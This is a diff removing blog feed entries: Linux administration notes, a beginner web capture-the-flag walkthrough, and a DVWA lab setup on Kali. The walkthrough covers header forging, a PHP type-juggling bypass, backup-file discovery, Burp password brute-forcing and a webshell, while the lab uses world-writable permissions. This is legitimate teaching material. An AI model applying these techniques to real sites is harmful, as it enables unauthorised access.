-</ol>
-</li>
-<li>
-<p>挂载实例</p>
-<ol>
-<li>添加一块硬盘
-<ol>
-<li>虚拟机添加硬盘</li>
-<li>分区</li>
-<li>格式化</li>
-<li>挂载</li>
-<li>设置可以自动挂载</li>
-<li>详细步骤：<a href="https://kite-007.github.io/linux-tian-jia-ying-pan/">link</a>.</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>
-<p>磁盘情况查询：df [-h]</p>
-</li>
-<li>
-<p>查询指定目录磁盘占用情况：du [-h] [目录]</p>
-<ul>
-<li>如果不加目录参数，则默认为当前目录。</li>
-<li>-s 指定目录占用大小汇总</li>
-<li>-h 带计量单位</li>
-<li>-a 含文件</li>
-<li>--max-depth=1 子目录深度</li>
-<li>-c 列出明细的同时，增加汇总值</li>
-</ul>
-</li>
-<li>
-<p>磁盘情况-工作实用指令</p>
-<ol>
-<li>统计/opt文件夹下文件的个数：ls -l /opt | grep &quot;^-&quot; | wc -l</li>
-</ol>
-<ul>
-<li>ls -l /opt：列出opt目录下的文件目录，grep &quot;^-&quot;：（属性以-开头）过滤掉目录留下文件，wc -l：统计留下的文件的数量。</li>
-</ul>
-<ol start="2">
-<li>统计/opt文件夹下文件的个数，包括子目录下的：ls -lR /opt | grep &quot;^-&quot; | wc -l</li>
-</ol>
-<ul>
-<li>-R：表示对子目录递归查询</li>
-</ul>
-<ol start="3">
-<li>以树状显示目录结构：tree /opt</li>
-</ol>
-<ul>
-<li>如果没有tree命令，则使用yum install tree 安装</li>
-</ul>
-</li>
-</ul>
-<h1 id="17-linux网络配置">17. Linux网络配置</h1>
-<p><strong>网络配置原理</strong><br>
-<img src="https://kite-007.github.io/post-images/1615280585697.png" alt="" loading="lazy"></p>
-<ol>
-<li>为什么是192.168.2.XXX而不是别的
-<ol>
-<li>在VMware的菜单设置中，打开（编辑）选项卡，选择（虚拟机网络编辑器）查看。</li>
-<li><img src="https://kite-007.github.io/post-images/1615281079781.png" alt="" loading="lazy"></li>
-<li>因为这里的子网IP和网关都是（192.168.2.XXX）&lt;我的是192.168.92.&gt;</li>
-<li>或者在win10下：两处都可以查看和修改。</li>
-<li><img src="https://kite-007.github.io/post-images/1615281513138.png" alt="" loading="lazy"></li>
-</ol>
-</li>
-</ol>
-<ul>
-<li>
-<p>查看网络IP和网关：</p>
-<ul>
-<li>win:ipconfig</li>
-<li>linux:ifconfig</li>
-<li>ping:测试网络连通性（ping [目的]）</li>
-</ul>
-</li>
-<li>
-<p>配置网络：<a href="https://kite-007.github.io/linux-wang-luo-pei-zhi/">link</a>.</p>
-<ol>
-<li>第一种方式：（自动获取）</li>
-<li>第二种方式：（指定IP）</li>
-</ol>
-</li>
-<li>
-<p>网络恢复：<a href="https://kite-007.github.io/linux-wu-wang-luo-jie-jue/">link</a>.</p>
-</li>
-</ul>
-<h1 id="18-设置主机名和hosts映射">18. 设置主机名和hosts映射</h1>
-<p><strong>为了方便记忆，可以给Linux设置主机名，也可以根据需要修改主机名</strong></p>
-<ul>
-<li>指令：hostname：查看主机名</li>
-<li>修改文件在/etc/hostname的指定</li>
-<li>修改后重启生效</li>
-</ul>
-<p><strong>设置hosts映射：修改后可以通过主机名（eg：ping）来找到某个Linux系统</strong></p>
-<ul>
-<li>windows
-<ul>
-<li>在c:\Windows\System32\drivers\etc\hosts文件</li>
-<li>eg：192.168.200.130 CentOS-7</li>
-</ul>
-</li>
-<li>Linux
-<ul>
-<li>在/etc/hosts文件里指定（vmnet8网络IP）</li>
-<li>eg：192.168.200.1 [PC主机名称]</li>
-</ul>
-</li>
-</ul>
-<p><em>hosts定义：一个文本文件，用来记录IP和hostname（主机名的映射关系）</em><br>
-<em>DNS,就是Domain Name System,域名系统，是互联网上作为域名和IP地址相互映射的一个分布式数据库。</em></p>
-<ul>
-<li>主机名解析机制（以www.baidu.com为例）：</li>
-</ul>
-<ol>
-<li>浏览器先检查浏览器缓存中有没有该域名解析IP地址，有就先调用这个IP完成解析；如果没有，就检查DNS解析器缓存，如果有直接返回IP完成解析。这两个缓存，可以理解为 本地解析器缓存</li>
-<li>一般来说，当电脑第一次成功访问其一网站后，在一定时间内，浏览器或操作系统会缓存他的IP地址(NS解析记录).如在cmd窗口中输入</li>
-</ol>
-<pre><code>ipconfig /displaydns //DNS域名解析缓存
-ipconfig /flushdns //手动清理dns缓存
-</code></pre>
-<ol start="3">
-<li>如果本地解析器缓存没有找到对应映射，检查系统中hosts文件中有没有配置对应的域名IP映射，如果有，则完成解析并返回。</li>
-<li>如果 本地DNS解析器缓存 和 hosts文件 中均没有找到对应的IP<br>
-则到域名服务DNS进行解析域</li>
-<li>图示：——》浏览器缓存——》操作系统DNS缓存——》HOSTS——》互联网DNS——》域名不存在</li>
-<li><img src="https://kite-007.github.io/post-images/1615336183551.png" alt="" loading="lazy"></li>
-</ol>
-<h1 id="19-初识进程">19. 初识进程</h1>
-<ol>
-<li>
-<p>介绍</p>
-<ol>
-<li>在Linux中每个执行的程序都称为一个进程。每一个进程都分配了一个ID号（pid）进程号。</li>
-<li>每个进程都以两种方式存在。前台与后台，所谓的前台进程就是用户目前屏幕上可以进行操作的。后台进程则是实际在操作，但由于屏幕上无法看到进程，通常使用后台方式运行。</li>
-<li>一般系统的服务器都是以后台进程的方式存在，而且都会常驻在系统中。直到关机才结束。</li>
-<li>程序与进程的关系：<img src="https://kite-007.github.io/post-images/1615337068082.png" alt="" loading="lazy"></li>
-</ol>
-</li>
-<li>
-<p>显示系统执行的进程</p>
-<ol>
-<li>ps命令：ps命令是用来查看目前系统中，有哪些正在执行，以及他们执行的状况。可以不加任何参数。显示的信息选项：</li>
-</ol>
-</li>
-</ol>
-<ul>
-<li>ps -a:显示当前终端所有的用户信息</li>
-<li>ps -u:以用户的格式显示进程信息</li>
-<li>ps -x:显示后台进程运行的参数</li>
-<li>字段：USER，说明：进程执行用户</li>
-<li>字段：PID，说明：进程识别号</li>
-<li>字段：%CPU，说明：占用cpu百分比</li>
-<li>字段：%MEM，说明：占用实际物理内存百分比</li>
-<li>字段：VSZ，说明：占用虚拟内存实际情况</li>
-<li>字段：RSS，说明：占用物理内存实际情况</li>
-<li>字段：TTY，说明：终端机号信息</li>
-<li>字段：STAT，说明：进程运行状态,s表示sleep,r表示run,d表示短期等待,z表示僵死进程（未释放内存）等等</li>
-<li>字段：START，说明：进程开始时间</li>
-<li>字段：TIME，说明：此进程所消耗CPU的时间</li>
-<li>字段：COMMAND（CMD），说明：启用进程的指令或者参数，过长会被截断</li>
-<li>字段：CMD，说明：正在执行的命令或进程名</li>
-<li>ps -e:显示所有进程</li>
-<li>ps -f:全格式</li>
-<li>字段：PPID，说明：父进程识别号</li>
-<li>字段：C，说明：cpu用于计算执行优先级的因子。数值越大，表明进程是cpu密集型运算，执行优先级会减低；数值越小，表明进程是I/O密集型运算，执行优先级会提高</li>
-<li>字段：STIME，说明：进程的启动时间</li>
-</ul>
-<ol start="3">
-<li>
-<p>终止进程kill和killall</p>
-<ol>
-<li>基本语法：
-<ol>
-<li>kill [选项] [进程号] （通过进程号杀死/终止进程）</li>
-<li>killall 进程名称 （通过进程名称杀死/终止进程，也支持通配符，这在系统因负载过大而变得很慢的时候有用）</li>
-<li>-9：表示强迫进程立即停止</li>
-</ol>
-</li>
-<li>案例：
-<ol>
-<li>踢掉某个非法登录的用户
-<ol>
-<li>使用Xshell登录一个用户，用root登录VMware，模拟</li>
-<li>root 指令（查看远程登陆的用户编号）：ps -aux | grep sshd</li>
-<li>kill [对应用户编号]，Xshell对应用户下线</li>
-</ol>
-</li>
-<li>终止远程sshd,在适当时候重启sshd服务
-<ol>
-<li>查看sshd进程号：ps -aux | grep sshd</li>
-<li>kill [对应编号]</li>
-<li>重启服务：/bin/systemctl start sshd.service</li>
-</ol>
-</li>
-<li>终止多个gedit ：killall
-<ol>
-<li>打开多个文本编辑器，模拟</li>
-<li>killall gedit，进程终止包括子进程</li>
-</ol>
-</li>
-<li>强制终止一个终端
-<ol>
-<li>查看本地终端：ps -aux | grep bash</li>
-<li>根据终端的打开时间，kill [对应编号]，发现终止不了终端，原因是被终止的终端正进行工作</li>
-<li>kill -9 [对应编号],终端消失,也可以终止目前终端</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>
-<p>查看进程树：pstree [选项]，更直观查看进程的信息</p>
-<ol>
-<li>常用选项
-<ol>
-<li>-p:显示进程的PID</li>
-<li>-u:显示进程的所属ID</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h1 id="20-服务管理service与端口打开关闭防火墙">20. 服务管理（service）与端口打开关闭（防火墙）</h1>
-<p><strong>服务的本质就是进程，但是是运行在后台的，通常都会监听某个端口，等待其他程序的请求，像（mysqld，sshd，防火墙等等），因此又称为守护进程。</strong><br>
-<img src="https://kite-007.github.io/post-images/1615366220960.png" alt="" loading="lazy"></p>
-<ol>
-<li>
-<p>service管理指令</p>
-<ol>
-<li>service [服务名] [start | stop | restart | reload| status]</li>
-<li>CentOS 7.0 之后 一些服务不再用service，而替换为systemctl</li>
-<li>还在使用service命令的服务，可以在 /etc/init.d中查看，ls -l /etc/init.d 其中的绿色字体。</li>
-<li>查看服务：（1）使用(setup)查看全部系统服务，(*)表示自启动，光标放入按空格键取消自启动（2）上述ls -l /etc/init.d可以查看部分服务。</li>
-</ol>
-</li>
-<li>
-<p>服务器的运行级别（runlevel）<em>前面已经简单提到过有七种运行级别</em></p>
-<ul>
-<li>0：关机，系统停机，系统默认运行级别不能设为0，否则不能正常启动</li>
-<li>1：单用户【找回丢失密码】工作状态，有root权限，禁止远程登陆</li>
-<li>2：多用户状态没有网络服务，因为没有FNS</li>
-<li>3：多用户状态有网络服务，有FNS，登陆后进入控制台命令模式</li>
-<li>4：系统未使用保留给用户</li>
-<li>5：(图形界面)，X11控制台，登陆后进入图形GUI模式</li>
-<li>6：(系统重启)系统正常关闭并重启，默认运行级别不能设为6，否则不能正常开机。</li>
-<li>开机流程说明：开机——》BIOS——》/boot——》systemd进程1——》运行级别——》运行级对应的服务</li>
-</ul>
-</li>
-<li>
-<p>服务级别命令：</p>
-<ol>
-<li>查看默认级别，systemctl get-default</li>
-<li>设置默认级别为级别3，systemctl set-default [multi-user.target]，/etc/inittab中有说明</li>
-<li>chkconfig命令：
-<ol>
-<li>介绍：
-<ol>
-<li>通过此命令可以给服务的各个运行级别设置 自启动/关闭</li>
-<li>chkconfig 指令管理的服务在/etc/init.d中查看，与system相同，在centos7之后很多服务用systemctl管理</li>
-</ol>
-</li>
-<li>基本语法：(chkconfig重新设置服务后自启动或关闭，需要reboot生效)
-<ol>
-<li>查看服务：chkconfig --list [| grep XXX]</li>
-<li>chkconfig 服务名 --list</li>
-<li>chkconfig --level 5 [服务名] on/off</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>systemctl命令：
-<ol>
-<li>systemctl管理命令：
-<ol>
-<li>systemctl [start | stop | restart | status] [服务名]</li>
-<li>systemctl管理的服务在/user/lib/systemd/system中查看（名称）</li>
-</ol>
-</li>
-<li>设置服务的自启动状态：
-<ol>
-<li>systemctl list-unit-files [| grep 服务名]，查看服务开机启动状态，grep可以进行过滤，服务名称可以不带.service。</li>
-<li>systemctl enable 服务名，设置服务开机启动，centos7之后,级别被简化为3和5，表示服务在3和5级别开机自启动。</li>
-<li>systemctl disable 服务名，关闭服务开机启动，centos7之后,级别被简化为3和5，表示服务在3和5级别开机关闭。</li>
-<li>systemctl is-enabled 服务名，查询某个服务是否是自启动的</li>
-<li>细节讨论：
-<ol>
-<li>关闭或者启用防火墙之后，立即生效。【telnet [IP] [端口]访问测试 】</li>
-<li>这种方式只是临时生效。当重启系统之后，还是回归以前对服务的设置。</li>
-<li>如果希望设置某个服务自启动或关闭永久生效，要使用systemctl [enable | disable] 服务名</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>firewall指令：可以打开或者关闭指定的端口。
-<ol>
-<li>打开端口：firewall-cmd --permanent --add-port=[端口号/协议]都要有</li>
-<li>关闭端口：firewall-cmd --permanent --remove-port=[端口号/协议]都要有</li>
-<li>重新载入才能生效：firewall-cmd --reload</li>
-<li>查询端口是否开放：firewall-cmd --query-port=[端口号/协议]都要有</li>
-<li><img src="https://kite-007.github.io/post-images/1615377144476.png" alt="" loading="lazy"></li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h1 id="21-动态监控进程交互显示执行的进程">21. 动态监控进程（交互显示执行的进程）</h1>
-<p><strong>top命令与ps命令相似。它们都用来显示正在执行的进程。top与ps最大的不同之处就在于，top命令在执行一段时间是可以更新正在运行的进程，并且可以进行交互操作。</strong></p>
-<ol>
-<li>top命令
-<ol>
-<li>top [选项]
-<ol>
-<li>-d [秒数]，指定top命令每隔几秒更新，默认是3秒</li>
-<li>-i，使top不再显示任何闲置或者僵死进程</li>
-<li>-p，通过指定监控进程ID来仅仅监控某个进程的状态</li>
-<li><img src="https://kite-007.github.io/post-images/1615377132909.png" alt="" loading="lazy"></li>
-</ol>
-</li>
-<li>交互操作说明
-<ol>
-<li>P:以CPU使用率排序，默认就是此项</li>
-<li>M:以内存的使用率排序</li>
-<li>N:以PID排序</li>
-<li>q:退出top</li>
-</ol>
-<ul>
-<li>监视特定用户
-<ol>
-<li>top：输入此命令，按Enter，查看执行的进程</li>
-<li>u：然后输入“u”回车，再输入用户名，即可</li>
-</ol>
-</li>
-<li>终止指定的进程
-<ol>
-<li>top：输入此命令，按Enter，查看执行的进程</li>
-<li>k：然后输入“k”回车，再输入要结束的进程ID号</li>
-</ol>
-</li>
-</ul>
-</li>
-</ol>
-</li>
-</ol>
-<h1 id="22-监控网络的状态查看协议使用的端口查看外部链接的状态">22. 监控网络的状态（查看协议使用的端口，查看外部链接的状态）</h1>
-<ol>
-<li>netstat命令：查看系统的网络情况
-<ol>
-<li>netstat [选项]
-<ol>
-<li>-an 按一定顺序排序输出</li>
-<li>-p 显示哪个进程在调用</li>
-</ol>
-<ul>
-<li>查看系统的网络情况按一定顺序排序输出：netstat -an | more</li>
-<li><img src="https://kite-007.github.io/post-images/1615379153012.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1615379935028.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1615379996171.png" alt="" loading="lazy"></li>
-<li>查看服务名为sshd的服务信息：netstat -anp | grep sshd</li>
-</ul>
-</li>
-</ol>
-</li>
-</ol>
-<h1 id="23-rpm与yum命令">23. rpm与yum命令</h1>
-<ul>
-<li>rpm包的管理<br>
-<strong>rpm是用于互联网下载包的打包及安装工具，它包含在某些Linux发布版中。它生成具有.RPM扩展名的文件。RPM是RedHat Package Manager（RedHat软件包管理工具）的缩写，类似Windows的setup.exe，这一些文件格式名称虽然打上了RedHat的标志，但是理念是通用的，很多Linux的发行版本都通用。</strong></li>
-</ul>
-<ol>
-<li>rpm包的简单查询指令：查询已安装的rpm列表，rpm -qa | grep XX
-<ul>
-<li>看当前系统是否安装了火狐：# rpm -qa | grep firefox</li>
-<li>firefox-78.8.0-1.el7.centos.x86_64</li>
-<li>火狐.版本号.操作系统.操作系统几位</li>
-<li>如果是i686，i386表示32位，noarch表示通用</li>
-</ul>
-</li>
-<li>rpm包的其它查询指令：
-<ol>
-<li>rpm -qa：查询所安装的所有rpm软件包
-<ul>
-<li>案例：rpm -qa | more</li>
-<li>案例：rpm -qa | grep X [rpm -qa | grep firefox]</li>
-</ul>
-</li>
-<li>rpm-q [软件包名]：查询软件包是否安装
-<ul>
-<li>案例：rpm -q firefox</li>
-</ul>
-</li>
-<li>rpm -qi [软件包名]：查询软件包信息
-<ul>
-<li>案例：rpm -qi firefox</li>
-</ul>
-</li>
-<li>rpm -ql [软件包名]：查询软件包中的文件
-<ul>
-<li>案例：rpm-ql firefox</li>
-</ul>
-</li>
-<li>rpm -qf [文件全路径名]：查询文件所属的软件包
-<ul>
-<li>案例： rpm -qf /etc/passwd</li>
-<li>案例：rpm -qf /root/install.log</li>
-</ul>
-</li>
-<li>rpm -e [RPM包的名称]：卸载rpm包
-<ul>
-<li>如果有其它的软件包依赖于要卸载的软件包，则会产生错误信息，无法卸载。</li>
-<li>如：rpm -e XXX ，</li>
-<li>如果要强制删除XXX则可以在后面加参数 --nodeps，就可以强制删除，但是如果这样做，依赖于该软件包的程序可能无法运行。</li>
-<li>如：rpm -e --nodeps XXX</li>
-</ul>
-</li>
-<li>rpm -ivh [RPM包全路径名称]：安装rpm包
-<ul>
-<li>i=install安装</li>
-<li>v=verbose提示</li>
-<li>h=hash进度条</li>
-<li>RPM包：再光盘中有大量RPM包，把找到的包路径放到/opt/目录下</li>
-</ul>
-</li>
-</ol>
-</li>
-</ol>
-<ul>
-<li>yum<br>
-<strong>yum是一个shell前端软件包管理器。基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次性安装所有依赖的软件包</strong></li>
-</ul>
-<ol>
-<li>yum的基本指令：
-<ol>
-<li>查询yum服务器是否有需要安装的软件
-<ul>
-<li>yum list | grep xx软件列表</li>
-</ul>
-</li>
-<li>安装指定的yum包
-<ul>
-<li>yum install XXX 下载安装</li>
-</ul>
-</li>
-<li>应用实例：
-<ul>
-<li>使用yum的方式安装firefox</li>
-<li><img src="https://kite-007.github.io/post-images/1615384078466.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1615384089543.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1615384106263.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1615384112024.png" alt="" loading="lazy"></li>
-</ul>
-</li>
-</ol>
-</li>
-</ol>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[WEB新手区]]></title>
-        <id>https://kite-007.github.io/web-xin-shou-qu/</id>
-        <link href="https://kite-007.github.io/web-xin-shou-qu/">
-        </link>
-        <updated>2020-10-13T13:42:06.000Z</updated>
-        <content type="html"><![CDATA[<p>所用插件：X-Forwarded-For Header、HackBar、FoxyProxy。<br>
-一，xff_referer</p>
-<p>伪造IP与Referer<br>
-1.<br>
-<img src="https://kite-007.github.io/post-images/1602602934990.png" alt="" loading="lazy"><br>
-2.使用X-Forwarded-For Header伪造123.123.123.123<br>
-<img src="https://kite-007.github.io/post-images/1602602940134.png" alt="" loading="lazy"><br>
-3.使用HackBar打勾Referer伪造<br>
-<img src="https://kite-007.github.io/post-images/1602602945517.png" alt="" loading="lazy"></p>
-<p>二，backup</p>
-<p>查看备份文件<br>
-网页备份文件的后缀为.bak<br>
-1.<br>
-<img src="https://kite-007.github.io/post-images/1602602978909.png" alt="" loading="lazy"><br>
-2.请求index.php.bak<br>
-<img src="https://kite-007.github.io/post-images/1602602990608.png" alt="" loading="lazy"><br>
-3.查看index.php的备份文件<br>
-<img src="https://kite-007.github.io/post-images/1602603003613.png" alt="" loading="lazy"></p>
-<p>三，command_execution</p>
-<p>查找flag<br>
-1.<br>
-<img src="https://kite-007.github.io/post-images/1602603036707.png" alt="" loading="lazy"><br>
-2.ping127.0.0.1<br>
-<img src="https://kite-007.github.io/post-images/1602603046039.png" alt="" loading="lazy"><br>
-3.查找flag.txt<br>
-<img src="https://kite-007.github.io/post-images/1602603051618.png" alt="" loading="lazy"><br>
-4.<br>
-<img src="https://kite-007.github.io/post-images/1602603056682.png" alt="" loading="lazy"></p>
-<p>四，cookie</p>
-<p>了解cookie</p>
-<p>cookie为储存在用户本地终端上的数据<br>
-1.<br>
-<img src="https://kite-007.github.io/post-images/1602603086624.png" alt="" loading="lazy"><br>
-2.cookie在开发者工具，网络一栏，点请求的网址，查看cookie<br>
-<img src="https://kite-007.github.io/post-images/1602603098830.png" alt="" loading="lazy"><br>
-3.继续查看响应<br>
-<img src="https://kite-007.github.io/post-images/1602603109036.png" alt="" loading="lazy"></p>
-<p>五，disabled_button</p>
-<p>disabled=&quot;&quot;使input功能丧失<br>
-1.<br>
-<img src="https://kite-007.github.io/post-images/1602603150444.png" alt="" loading="lazy"><br>
-2.查看源码，发现disabled=&quot;&quot;,使input一行功能丧失，所以<br>
-<img src="https://kite-007.github.io/post-images/1602603157099.png" alt="" loading="lazy"><br>
-3.所以去掉disabled=&quot;&quot;后响应网站，得到flag<br>
-<img src="https://kite-007.github.io/post-images/1602603161359.png" alt="" loading="lazy"><br>
-4.另一种方式<br>
-<img src="https://kite-007.github.io/post-images/1602603165655.png" alt="" loading="lazy"></p>
-<p>六，get_post</p>
-<p>了解get post<br>
-GET - 从资源请求数据<br>
-POST - 向资源提交数据</p>
-<ol>
-<li></li>
-</ol>
-<p><img src="https://kite-007.github.io/post-images/1602603195591.png" alt="" loading="lazy"><br>
-2.get:.在url后加入/?a=1<br>
-<img src="https://kite-007.github.io/post-images/1602603200041.png" alt="" loading="lazy"><br>
-3.勾选post data输入b=2<br>
-<img src="https://kite-007.github.io/post-images/1602603204698.png" alt="" loading="lazy"></p>
-<p>七，robots</p>
-<p>了解robots<br>
-robots是网站跟爬虫间的协议<br>
-1.<br>
-<img src="https://kite-007.github.io/post-images/1602603230285.png" alt="" loading="lazy"><br>
-2.在url栏后加/robots.txt查看，得到如图<br>
-<img src="https://kite-007.github.io/post-images/1602603236973.png" alt="" loading="lazy"><br>
-3.<br>
-<img src="https://kite-007.github.io/post-images/1602603241748.png" alt="" loading="lazy"></p>
-<p>八，simple_js</p>
-<p>js语法<br>
-1.进入随便输入密码查看开发者工具<br>
-<img src="https://kite-007.github.io/post-images/1602603267071.png" alt="" loading="lazy"><br>
-2.分析:无论输入什么，都返回了pass，而密码在dechiffre（h），而h是&quot;\x···\x30&quot;<br>
-<img src="https://kite-007.github.io/post-images/1602603277929.png" alt="" loading="lazy"><br>
-3.对h进行转码，得到一组ASCII码（https://www.bejson.com/convert/ox2str/）<br>
-<img src="https://kite-007.github.io/post-images/1602603296670.png" alt="" loading="lazy"><br>
-4.ASCII编码转换（https://www.qqxiuzi.cn/bianma/ascii.htm）<br>
-<img src="https://kite-007.github.io/post-images/1602603301203.png" alt="" loading="lazy"><br>
-5.完成<br>
-<img src="https://kite-007.github.io/post-images/1602603307908.png" alt="" loading="lazy"></p>
-<p>九，simple_php</p>
-<p>php特性<br>
-在PHP中，不同类型比较时会被自动转换成相同的类型</p>
-<p>1.发现：a要为零，还得满足a为字符串，则请求/?a=0.0(0.0表示字符串)<br>
-<img src="https://kite-007.github.io/post-images/1602603323157.png" alt="" loading="lazy"><br>
-2.b不能是数字，b还要大于1234，所以让b=12345a（字符串），到比较时b会被转化类型<br>
-<img src="https://kite-007.github.io/post-images/1602603333969.png" alt="" loading="lazy"><br>
-3.<br>
-<img src="https://kite-007.github.io/post-images/1602603338681.png" alt="" loading="lazy"></p>
-<p>十，view_source</p>
-<p>f12开发者工具</p>
-<ol>
-<li></li>
-</ol>
-<p><img src="https://kite-007.github.io/post-images/1602603361874.png" alt="" loading="lazy"><br>
-2.f12开发者工具<br>
-<img src="https://kite-007.github.io/post-images/1602603370722.png" alt="" loading="lazy"></p>
-<p>十一，weak_auth</p>
-<p>Burp密码爆破</p>
-<ol>
-<li></li>
-</ol>
-<p><img src="https://kite-007.github.io/post-images/1602603420235.png" alt="" loading="lazy"><br>
-2.随便输入用户名，发现用户名为admin<br>
-<img src="https://kite-007.github.io/post-images/1602603430620.png" alt="" loading="lazy"><br>
-3.<br>
-<img src="https://kite-007.github.io/post-images/1602603436276.png" alt="" loading="lazy"><br>
-4.查看源码，发现需要一个字典（密码爆破），所以使用Burp<br>
-<img src="https://kite-007.github.io/post-images/1602603445185.png" alt="" loading="lazy"><br>
-5.使用Burp抓包，设置变量<br>
-<img src="https://kite-007.github.io/post-images/1602603464715.png" alt="" loading="lazy"><br>
-6.<br>
-<img src="https://kite-007.github.io/post-images/1602603471991.png" alt="" loading="lazy"><br>
-7.加载字典<br>
-<img src="https://kite-007.github.io/post-images/1602603483650.png" alt="" loading="lazy"><br>
-8.设置线程（最大127），得到密码为123456<br>
-<img src="https://kite-007.github.io/post-images/1602603487809.png" alt="" loading="lazy"><br>
-9.<br>
-<img src="https://kite-007.github.io/post-images/1602603495036.png" alt="" loading="lazy"></p>
-<p>十二，webshell</p>
-<p>了解shell，蚁剑<br>
-1.<br>
-<img src="https://kite-007.github.io/post-images/1602603509021.png" alt="" loading="lazy"><br>
-2.<br>
-<img src="https://kite-007.github.io/post-images/1602603516788.png" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[kali-linux 搭建DVWA]]></title>
-        <id>https://kite-007.github.io/kali-linux-da-jian-dvwa/</id>
-        <link href="https://kite-007.github.io/kali-linux-da-jian-dvwa/">
-        </link>
-        <updated>2020-10-12T12:02:41.000Z</updated>
-        <content type="html"><![CDATA[<p>在主机下载DVWAhttp://www.dvwa.co.uk/并解压，重命名为dvwa后拖进虚拟机的桌面目录。（VMware Tools安装方法https://blog.csdn.net/u011585332/article/details/105120544?utm_source=app）</p>
-<p>👁第一：打开dvwa/dvwa/config，将config.inc.php.dist的后缀.dist去掉。<br>
-<img src="https://kite-007.github.io/post-images/1602505129501.png" alt="" loading="lazy"></p>
-<p>👁第二：打开config.inc.php<br>
-修改为：<br>
-$_DVWA[ 'db_user' ]     = 'dvwa';<br>
-$_DVWA[ 'db_password' ] = 'dvwa';</p>
-<p>👁第三：进入终端<br>
-输入：<br>
-chmod -R 777 /root/桌面/dvwa  	                #赋予dvwa文件夹相应的权限<br>
-mv /root/桌面/dvwa /var/www/html             #将桌面上的dvwa文件移至/var/www/htm下<br>
-service mysql start		#启动mysql服务<br>
-mysql -u root -p 		#进入mysql（密码默认为空/root，直接回车）<br>
-create user 'dvwa'@'localhost' identified by 'dvwa';#创建用户名（对应第二步）<br>
-grant all on <em>.</em> to 'dvwa'@'localhost';                                  #赋权<br>
-set password for 'dvwa'@'localhost' = password('dvwa');#设置密码（对应第二步）<br>
-exit                #退出mysql<br>
-service apache2 start 	      #启动apache2服务<br>
-<img src="https://kite-007.github.io/post-images/1602506995688.png" alt="" loading="lazy"></p>
-<p>👁第四：打开浏览器，输入127.0.0.1/dvwa，回车进入后会自动跳转到127.0.0.1/dvwa/setup.php<br>
-默认账号密码：admin/password<br>
-<img src="https://kite-007.github.io/post-images/1602507875585.png" alt="" loading="lazy"><br>
-<img src="https://kite-007.github.io/post-images/1602507814348.png" alt="" loading="lazy"></p>
-<p>👁第五：后续问题解决：https://www.jianshu.com/p/05135f8de848（参考）</p>
 ]]></content>
     </entry>
 </feed>
